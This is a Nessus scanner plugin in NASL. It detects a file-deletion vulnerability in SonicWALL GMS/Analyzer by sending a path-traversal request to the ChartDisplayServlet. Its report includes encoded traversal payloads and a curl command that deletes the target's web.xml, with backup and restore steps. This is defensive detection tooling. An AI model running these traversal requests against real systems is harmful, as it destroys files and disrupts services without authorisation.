#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(109575);
  script_version("1.2");
  script_cvs_date("Date: 2018/05/07 18:31:44");

  script_name(english:"SonicWALL Global Management System (GMS) / Analyzer sgms Webapp File Deletion");
  script_summary(english:"Attempts to delete a file outside the sgms webapp.");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host is affected by a
file deletion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The SonicWALL Global Management System (GMS) / Analyzer running on
the remote host is affected by a file deletion vulnerability within
the sgms web application due to the failure to validate user input
to the ChartDisplayServlet servlet. An unauthenticated, remote
attacker can exploit this issue to retrieve and delete files for the
sgms web application.

Note that GMS / Analyzer is reportedly affected by other
vulnerabilities as well; however, this plugin has not tested for these.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to SonicWALL Global Management System (GMS) / Analyzer version
8.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");

  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/05/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sonicwall:global_management_system");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sonicwall:analyzer");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("sonicwall_universal_management_detect.nbin");
  script_require_keys("installed_sw/sonicwall_universal_management_suite");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app_kb   = 'sonicwall_universal_management_suite';

# Plugin will exit if app is not detected on host
get_install_count(app_name:app_kb, exit_if_zero:TRUE);

# Plugin will exit if app is not detected on this port
port = get_http_port(default:80);
install = get_single_install(app_name:app_kb, port:port, exit_if_unknown_ver:FALSE);

# Non-existent file in the appliance webapp
url = '/sgms/chart_display?chart=%2e%2e%2f%2e%2e%2fappliance%2fWEB-INF%2fno_such_file.xml';
res = http_send_recv3(
        port        : port, 
        method      : 'GET',
        item        : url,
        exit_on_fail: TRUE
      );

# ChartDisplayServlet produces an exception as it tries access a file in a different webapp.
if (res[0] =~ '500')
{
  req = http_last_sent_request();
  attack_url = '/sgms/chart_display?chart=%2e%2e%2fWEB-INF%2fweb.xml';
  report = 
    'Nessus was able to detect the vulnerability using the following request :' +
    '\n\n' +
    req +
    '\n\n'+ 
    'User can verify the vulnerability by: \n\n' +
    "1) Save a copy of <GMS_INSTALLATION_DIR>\Tomcat\webapps\sgms\WEB-INF\web.xml" + '\n' +
    '2) Run curl http://' + get_host_ip() + attack_url + '\n' +
    '3) Verify the web.xml file is deleted\n' +
    '4) Copy/Move the saved copy to web.xml\n';

  security_report_v4(
    port      : port,
    severity  : SECURITY_HOLE,
    extra     : report
  );
} 
#
# In a patched version, ChartDisplayServlet is removed. So the likely response is 404.
#
else
{
  audit(AUDIT_HOST_NOT, 'affected');
}
